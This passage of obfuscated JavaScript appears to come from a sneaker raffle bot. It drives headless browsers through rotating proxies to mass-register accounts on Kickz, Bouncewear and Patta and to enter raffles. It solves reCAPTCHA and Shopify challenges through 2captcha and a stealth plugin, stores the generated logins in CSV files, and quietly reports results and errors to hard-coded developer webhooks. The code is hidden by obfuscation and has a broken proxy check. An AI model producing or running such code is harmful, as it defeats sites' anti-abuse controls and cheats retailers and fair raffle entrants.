                const _0x58bf3e = document['querySelector']('#continue_button');
                for (var _0x2cfd0d = 0x0; _0x2cfd0d < 0x5; _0x2cfd0d++) {
                    if (_0x58bf3e) {
                        _0x58bf3e['click'](), _0x58bf3e['click']();
                        break;
                    } else
                        _0x5df609(0xfa0);
                }
            }), await _0x13135a['waitForTimeout'](0x1194);
            try {
                await _0x13135a['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x13135a['evaluate'](() => {
                const _0x3e9549 = document['querySelector']('#continue_button');
                for (var _0x5aeb80 = 0x0; _0x5aeb80 < 0x5; _0x5aeb80++) {
                    if (_0x3e9549) {
                        _0x3e9549['click']();
                        break;
                    } else
                        _0x5df609(0xfa0);
                }
            }), await _0x13135a['waitForTimeout'](0x7d0), console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x13135a['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x13135a['evaluate'](() => {
                const _0x3ce931 = document['querySelector']('#continue_button');
                for (var _0x59b0eb = 0x0; _0x59b0eb < 0x5; _0x59b0eb++) {
                    if (_0x3ce931) {
                        _0x3ce931['click']();
                        break;
                    } else
                        _0x5df609(0xfa0);
                }
            }), await _0x13135a['waitForTimeout'](0x1194), await _0x13135a['waitForSelector']('#continue_button'), _0x13135a['evaluate'](() => {
                const _0x3d6269 = document['querySelector']('#continue_button');
                for (var _0x4f9e8a = 0x0; _0x4f9e8a < 0x5; _0x4f9e8a++) {
                    if (_0x3d6269) {
                        _0x3d6269['click']();
                        break;
                    } else
                        _0x5df609(0xfa0);
                }
            });
            try {
                await _0x13135a['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '')
                    try {
                        await _0x2ebaaf(_0x26509c['webhook'], _0x2e7bab['succesDEVMSG']);
                    } catch {
                    }
                await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x2e7bab['succesDEVMSG']), await _0x5df609(0xc8);
                try {
                    await _0x2ebaaf(_0x19c58b, _0x2e7bab['succesPUBMSG']);
                } catch {
                }
            } catch (_0x16ea4d) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x16ea4d));
            }
        } catch (_0x442bd0) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20' + _0x442bd0)), _0x1c0526 = '' + _0x442bd0;
            var _0x24bc58 = await _0x4ec2d3(_0x3178c6[_0x5f2041], _0x41c5e, 'dev', !![], _0x1c0526);
            _0x2e7bab['errorDEV'] = { 'embeds': [_0x24bc58] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x2e7bab['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x2e7bab['errorDEV']), _0x4942db = 'yes';
        } finally {
            _0xec453 && _0xec453['close']();
            if (_0x4942db == 'yes' && _0x41003c != 0x5 && _0x1c0526 != 'Size\x20Not\x20Found') {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Retrying')), _0x5f2041 = _0x5f2041 - 0x1, _0x41003c = _0x41003c + 0x1;
                continue;
            }
            if (_0x5f2041 + 0x1 == _0x3178c6['length']) {
                console['log'](_0x1ee4d0['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x5df609(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['AfewDelay'] + '\x20ms'), await _0x5df609(_0x26509c['AfewDelay']);
        }
    }
};
async function _0x4ca625(_0x4ecff1, _0x428998, _0xb188e5, _0x13ca5f) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x11105d = 0x0; _0x11105d < _0xb188e5['length']; _0x11105d++) {
        var _0x40e354 = '', _0x214607 = 0x0;
        _0x2be893(_0x428998['name'] + '\x20Task\x20' + (_0x11105d + 0x1) + '\x20/\x20' + _0xb188e5['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0xb188e5, _0x11105d);
        var _0x1b4ebe = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }];
        const _0x461070 = { 'embeds': _0x1b4ebe };
        var _0x1c6851 = await _0x4ec2d3(_0xb188e5[_0x11105d], _0x428998, 'acc', ![]);
        const _0x571c07 = { 'succesDEVMSG': { 'embeds': [_0x1c6851] } };
        if (_0xb188e5[_0x11105d]['Email'] == '' || _0xb188e5[_0x11105d]['FirstName'] == '' || _0xb188e5[_0x11105d]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0xb188e5[_0x11105d]['Password'] == '' && (_0xb188e5[_0x11105d]['Password'] = 'JRaffles23!');
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x4c2130 = _0x13ca5f[_0x11105d]['split'](':');
        else
            var _0x5f338c = Math['round'](Math['random']() * (_0x13ca5f['length'] - 0x1)), _0x4c2130 = _0x13ca5f[_0x5f338c]['split'](':');
        const _0x4fa10a = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4c2130[0x0] + ':' + _0x4c2130[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5f4827 = await _0x4fa10a['newPage']();
            await _0x5f4827['authenticate']({
                'username': '' + _0x4c2130[0x2],
                'password': '' + _0x4c2130[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5f4827['setRequestInterception'](!![]), _0x5f4827['on']('request', _0x336cac => {
                _0x336cac['resourceType']() === 'image' || _0x336cac['resourceType']() === 'font' || _0x336cac['resourceType']() === 'media' ? _0x336cac['abort']() : _0x336cac['continue']();
            }), await _0x5f4827['goto'](_0x4ecff1), await _0x5df609(0xbb8), console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5f4827['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5f4827['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5f4827['waitForSelector']('#button-register'), await _0x5df609(0x7d0), await _0x5f4827['evaluate'](() => {
                const _0x52f1f5 = document['querySelector']('#button-register');
                _0x52f1f5['click']();
            }), console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x5df609(0x1388), await _0x5f4827['waitForSelector']('#customer_salutation'), await _0x5f4827['select']('#customer_salutation', 'mr'), await _0x5df609(0x7d0), await _0x5f4827['waitForSelector']('#customer_firstname'), await _0x5f4827['type']('#customer_firstname', '' + _0xb188e5[_0x11105d]['FirstName']), await _0x5df609(0x352), await _0x5f4827['waitForSelector']('#customer_lastname'), await _0x5f4827['type']('#customer_lastname', '' + _0xb188e5[_0x11105d]['LastName']), await _0x5df609(0x352), await _0x5f4827['type']('#email-input', '' + _0xb188e5[_0x11105d]['Email']), await _0x5df609(0x352), await _0x5f4827['type']('#email-confirm-input', '' + _0xb188e5[_0x11105d]['Email']), await _0x5df609(0x352), await _0x5f4827['type']('#register-password', '' + _0xb188e5[_0x11105d]['Password']), await _0x5df609(0x352), await _0x5f4827['type']('#password-confirm', '' + _0xb188e5[_0x11105d]['Password']), await _0x5df609(0x352), console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5f4827['click']('#consent'), await _0x5df609(0x1f4);
            const _0x11c0f2 = await _0x5f4827['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x11c0f2) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x5f4827['click']('#buttonRegister');
            try {
                await _0x5f4827['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Account\x20' + _0xb188e5[_0x11105d]['Email'] + '\x20Generated!')), console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0xb188e5[_0x11105d]['Email'])), await _0x5df609(0x4b0);
            async function _0x44d703() {
                console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x219341 = await _0x3df5d6['get']('Code');
                return _0x219341['Code'];
            }
            ;
            code = await _0x44d703(), _0x5df609(0x320), console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Verifying..'), await _0x5f4827['type']('#verificationCode', code), await _0x5df609(0x1f4), await _0x5f4827['click']('#buttonVerify'), await _0x5df609(0x190), await _0x5f4827['click']('#buttonVerify'), await _0x5df609(0x3e8);
            try {
                await _0x5f4827['waitForSelector']('div.b-user_greeting'), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Account\x20' + _0xb188e5[_0x11105d]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x2c62e3['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0xb188e5[_0x11105d]['Email'] + ',' + _0xb188e5[_0x11105d]['Password'] + ','), console['log'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Account\x20' + _0xb188e5[_0x11105d]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x571c07['succesDEVMSG']);
                } catch {
                }
                await _0x2ebaaf(_0x130765, _0x571c07['succesDEVMSG']);
            } catch {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x3e0518) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20' + _0x3e0518)), _0x1b4ebe[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x1b4ebe[0x0]['description'] = '' + _0x3e0518, await _0x2ebaaf(_0x2664b3, _0x461070), _0x40e354 = 'yes';
        } finally {
            _0x4fa10a && _0x4fa10a['close']();
            if (_0x40e354 == 'yes' && _0x214607 != 0x5) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x428998['name'] + ']\x20Task\x20' + (_0x11105d + 0x1) + '\x20:\x20Retrying')), _0x11105d = _0x11105d - 0x1, _0x214607 = _0x214607 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x3a6b0b(_0x36c9f7, _0x5c4736, _0x5a5007) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xf4a2e1 = 0x0; _0xf4a2e1 < _0x5c4736['length']; _0xf4a2e1++) {
        var _0x24b904, _0x4443bf = '', _0x6c5c3d = 0x0;
        _0x2be893(_0x36c9f7['name'] + '\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20/\x20' + _0x5c4736['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8);
        var _0x1f900d = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Product',
                    'value': '' + _0x5c4736[_0xf4a2e1]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5c4736[_0xf4a2e1]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }], _0x96e5b0 = await _0x4ec2d3(_0x5c4736[_0xf4a2e1], _0x36c9f7, 'dev', ![]), _0x2f2d47 = await _0x4ec2d3(_0x5c4736[_0xf4a2e1], _0x36c9f7, 'pub', ![]);
        const _0x411094 = {
            'succesDEVMSG': { 'embeds': [_0x96e5b0] },
            'succesPUBMSG': { 'embeds': [_0x2f2d47] }
        };
        await _0x5a7b4a(_0x5c4736, _0xf4a2e1);
        if (_0x5c4736[_0xf4a2e1]['Email'] == '' || _0x5c4736[_0xf4a2e1]['Password'] == '' || _0x5c4736[_0xf4a2e1]['FirstName'] == '' || _0x5c4736[_0xf4a2e1]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x2e7396 = _0x5a5007[_0xf4a2e1]['split'](':');
        else
            var _0x2462d3 = Math['round'](Math['random']() * (_0x5a5007['length'] - 0x1)), _0x2e7396 = _0x5a5007[_0x2462d3]['split'](':');
        const _0x43ab2b = await _0x2d6840['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2e7396[0x0] + ':' + _0x2e7396[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x229854 = await _0x43ab2b['newPage']();
            await _0x229854['authenticate']({
                'username': '' + _0x2e7396[0x2],
                'password': '' + _0x2e7396[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x229854['setRequestInterception'](!![]), _0x229854['on']('request', _0x478249 => {
                _0x478249['resourceType']() === 'image' || _0x478249['resourceType']() === 'font' || _0x478249['resourceType']() === 'media' ? _0x478249['abort']() : _0x478249['continue']();
            }), await _0x229854['goto']('' + _0x5c4736[_0xf4a2e1]['Url'], { 'waitUntil': 'networkidle2' }), await _0x5df609(0x12c);
            try {
                await _0x229854['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x229854['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x229854['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x229854['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x229854['waitForSelector']('#username'), await _0x229854['type']('#username', _0x5c4736[_0xf4a2e1]['Email']), await _0x229854['waitForSelector']('#password'), await _0x229854['type']('#password', _0x5c4736[_0xf4a2e1]['Password']), await _0x5df609(0x190), await _0x229854['click']('#buttonSubmit'), await _0x229854['waitForSelector']('div.b-user_greeting'), console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x5df609(0x1f4), await _0x229854['goto']('' + _0x5c4736[_0xf4a2e1]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5c4736[_0xf4a2e1]['Size']);
            let _0x503888 = _0x5c4736[_0xf4a2e1]['Size']['replace']('.5', '\x201/2');
            await _0x229854['click']('button[title=\x22' + _0x503888 + '\x22]'), await _0x5df609(0x1f4);
            try {
                await _0x229854['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x5df609(0x12c), console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x229854['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_addressFields_firstName', _0x5c4736[_0xf4a2e1]['FirstName']), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_addressFields_lastName', _0x5c4736[_0xf4a2e1]['LastName']), await _0x5df609(0x12c), await _0x229854['select']('#dwfrm_raffle_addressFields_country', _0x5c4736[_0xf4a2e1]['Country']), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_addressFields_city', _0x5c4736[_0xf4a2e1]['City']), await _0x5df609(0x12c);
            _0x5c4736[_0xf4a2e1]['Postcode'] == undefined && (_0x5c4736[_0xf4a2e1]['Postcode'] = _0x5c4736[_0xf4a2e1]['Zip']);
            await _0x229854['type']('#dwfrm_raffle_addressFields_postalCode', _0x5c4736[_0xf4a2e1]['Postcode']), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_addressFields_address1', _0x5c4736[_0xf4a2e1]['Address1']), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_addressFields_address2', _0x5c4736[_0xf4a2e1]['HouseNumber']), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x5c4736[_0xf4a2e1]['Address2']), await _0x5df609(0x12c), await _0x229854['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x5df609(0x12c), await _0x229854['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x5c4736[_0xf4a2e1]['Follower']), await _0x5df609(0x1f4), await _0x229854['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x5df609(0x1f4), console['log'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20' + _0x1ee4d0['blue']('Awaiting\x20Paypal\x20Payment')), await _0x229854['click']('.b-paypal_button');
            try {
                await _0x229854['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x411094['succesDEVMSG']), await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x411094['succesDEVMSG']), await _0x5df609(0xc8), await _0x2ebaaf(_0x19c58b, _0x411094['succesPUBMSG']);
            } catch (_0x3f8228) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x3f8228)), _0x24b904 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x3f8228;
                var _0x56da84 = await _0x4ec2d3(_0x5c4736[_0xf4a2e1], _0x36c9f7, 'dev', !![], _0x24b904);
                _0x411094['errorDEV'] = { 'embeds': [_0x56da84] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x411094['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x411094['errorDEV']);
            }
        } catch (_0x18c4f9) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20' + _0x18c4f9)), _0x24b904 = '' + _0x18c4f9;
            var _0x56da84 = await _0x4ec2d3(_0x5c4736[_0xf4a2e1], _0x36c9f7, 'dev', !![], _0x24b904);
            _0x411094['errorDEV'] = { 'embeds': [_0x56da84] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x411094['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x411094['errorDEV']), _0x4443bf = 'yes';
        } finally {
            _0x43ab2b && _0x43ab2b['close']();
            if (_0x4443bf == 'yes' && _0x6c5c3d != 0x5) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x36c9f7['name'] + ']\x20Task\x20' + (_0xf4a2e1 + 0x1) + '\x20:\x20Retrying')), _0xf4a2e1 = _0xf4a2e1 - 0x1, _0x6c5c3d = _0x6c5c3d + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['AfewDelay'] + '\x20ms'), await _0x5df609(_0x26509c['AfewDelay']);
        }
    }
}
async function _0x50ac8a(_0xa72742, _0x564c22) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5e8543 = 0x0; _0x5e8543 < bouncewear['length']; _0x5e8543++) {
        await _0x5a7b4a(bouncewear, _0x5e8543);
        if (bouncewear[_0x5e8543]['Email'] == '' || bouncewear[_0x5e8543]['Password'] == '' || bouncewear[_0x5e8543]['FirstName'] == '' || bouncewear[_0x5e8543]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x48214a = _0x32665a()[_0x5e8543]['split'](':');
        else
            var _0x43672f = Math['round'](Math['random']() * (_0x32665a()['length'] - 0x1)), _0x48214a = _0x32665a()[_0x43672f]['split'](':');
        const _0x18c17d = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x48214a[0x0] + ':' + _0x48214a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1669fa = await _0x18c17d['newPage']();
            await _0x1669fa['authenticate']({
                'username': '' + _0x48214a[0x2],
                'password': '' + _0x48214a[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1669fa['setRequestInterception'](!![]), _0x1669fa['on']('request', _0x4fdbff => {
                _0x4fdbff['resourceType']() === 'image' || _0x4fdbff['resourceType']() === 'font' || _0x4fdbff['resourceType']() === 'media' ? _0x4fdbff['abort']() : _0x4fdbff['continue']();
            }), await _0x1669fa['goto'](_0xa72742), await _0x5df609(0xbb8), await _0x1669fa['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1669fa['type']('#RegisterForm-FirstName', '' + bouncewear[_0x5e8543]['FirstName']), await _0x5df609(0x226), await _0x1669fa['type']('#RegisterForm-LastName', '' + bouncewear[_0x5e8543]['LastName']), await _0x5df609(0x226), await _0x1669fa['type']('#RegisterForm-email', '' + bouncewear[_0x5e8543]['Email']), await _0x5df609(0x226), await _0x1669fa['type']('#RegisterForm-password', '' + bouncewear[_0x5e8543]['Password']), await _0x5df609(0x226), await _0x1669fa['click']('#marketing'), console['log'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Submitting..'), await _0x1669fa['$eval']('#RegisterForm', _0x100c08 => _0x100c08['submit']()), await _0x5df609(0x1f40), console['log'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x1669fa['solveRecaptchas'](), await _0x1669fa['click']('.shopify-challenge__button.btn');
            async function _0xa2d98() {
                for (var _0x461ac6 = 0x0; _0x461ac6 < 0x4; _0x461ac6++) {
                    try {
                        console['log']('try'), await _0x1669fa['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20' + _0x1ee4d0['red']('Catpcha\x20failed,\x20retrying..')), await _0x1669fa['solveRecaptchas'](), await _0x1669fa['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0xa2d98(), console['log'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5df609(0x1f4);
            try {
                await _0x1669fa['waitForSelector']('.featured-title'), await _0x5df609(0x1f4), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x5e8543]['Email'] + '\x20Generated!')), _0x2c62e3['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x5e8543]['Email'] + ',' + bouncewear[_0x5e8543]['Password']), console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x564c22['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x5e8543]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x32af48) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x32af48));
            }
        } catch (_0x2c3cf0) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x5e8543 + 0x1) + '\x20:\x20' + _0x2c3cf0));
        } finally {
            _0x18c17d && _0x18c17d['close'](), console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x1679b1(_0x30d317, _0x59e809, _0x4d27e3, _0x236f5b) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x488c6d = 0x0; _0x488c6d < _0x4d27e3['length']; _0x488c6d++) {
        var _0x44682e = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }];
        const _0x8842ea = { 'embeds': _0x44682e };
        _0x2be893(_0x59e809['name'] + '\x20Task\x20' + (_0x488c6d + 0x1) + '\x20/\x20' + _0x4d27e3['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x4d27e3, _0x488c6d);
        var _0x521cd7 = await _0x4ec2d3(_0x4d27e3[_0x488c6d], _0x59e809, 'acc', ![]);
        const _0x529ffa = { 'succesDEVMSG': { 'embeds': [_0x521cd7] } };
